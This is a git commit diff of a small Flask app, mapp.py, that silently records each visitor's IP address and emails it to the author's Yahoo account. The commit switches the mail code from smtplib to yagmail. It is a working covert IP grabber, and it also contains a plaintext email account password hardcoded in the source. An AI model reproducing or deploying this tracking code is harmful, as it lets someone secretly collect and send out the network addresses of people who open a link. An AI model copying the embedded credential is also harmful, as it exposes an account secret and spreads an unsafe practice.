bca69cde4fa100ffe3d92f3c8a79bcfaeadc6acf
sementinha-hostil <136841545+sementinha-hostil@users.noreply.github.com>
2023-07-10 12:43:07 -0300

    Atualizar o mapp.py

--- mapp.py
+++ mapp.py
@@ -1,5 +1,5 @@
 from flask import Flask, request
-import smtplib
+import yagmail
 
 app = Flask(__name__)
 
@@ -8,8 +8,6 @@ def index():
     ip = request.remote_addr
 
     # Configuração do servidor de email
-    email_server = 'smtp.mail.yahoo.com'
-    email_port = 465
     email_sender = 'minadoooo11@yahoo.com'
     email_password = 'prosopopei4'
     email_recipient = 'minadoooo11@yahoo.com'
@@ -17,13 +15,11 @@ def index():
     # Criação da mensagem
     subject = 'Endereço IP do Usuário'
     message = f'O endereço IP do usuário é: {ip}'
-    email_text = f'Subject: {subject}\n\n{message}'
 
     # Envio do email
     try:
-        with smtplib.SMTP_SSL(email_server, email_port) as server:
-            server.login(email_sender, email_password)
-            server.sendmail(email_sender, email_recipient, email_text)
+        yag = yagmail.SMTP(email_sender, email_password)
+        yag.send(email_recipient, subject, message)
     except Exception as e:
         return f'Erro ao enviar o email: {str(e)}'
 
